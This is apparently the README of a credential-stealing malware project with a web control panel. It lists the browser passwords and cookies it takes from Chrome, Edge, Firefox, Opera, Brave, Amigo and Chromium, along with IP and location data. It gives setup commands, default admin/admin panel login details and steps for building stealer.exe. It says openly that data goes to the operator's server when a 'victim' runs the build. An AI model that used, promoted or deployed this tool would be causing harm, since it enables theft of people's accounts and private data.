# Stealer with WebPanel

This is a browsers and info stealer (windows only yet) with web gui panel, authentication, database and build in panel.

<b>What info you can take</b>:

  ip, contry, city, host
  google chrome password and cookies<br>
  amigo password and cookies
  brave password and cookies
  microsoft edge password and cookies

  mozilla firefox password and cookies

  opera password and cookies

  chromium password and cookies

(Was tested in windows10 and Ubuntu22.04)

![image](https://user-images.githubusercontent.com/101527966/174895329-12b45188-9931-44ce-b142-1d692636ba50.png)

# How to setup:

$ pip install -r requirements.txt

open the config.py

change the server_host on your ip

![image](https://user-images.githubusercontent.com/101527966/174895939-564db7cc-cb90-436c-a8ca-5df0c8e7b005.png)

$ cd server

$ python start.ru


# Login
  login: admin
  
  password: admin
  
  (You can change it in config.py)
  
![image](https://user-images.githubusercontent.com/101527966/174895245-7c18731c-b10d-4340-bda0-390bbf4baeb0.png)




# Build stealer
You can build stealer.exe in panel

![image](https://user-images.githubusercontent.com/101527966/174895155-0c0b570e-a655-4492-8811-04b87e5730b4.png)

When victim start the stealer-build.exe or __main__.py in /client data will send on your server. After this you can check data in home in panel.

![image](https://user-images.githubusercontent.com/101527966/174898453-5c372ecd-4d84-43ce-9067-61536accc944.png)
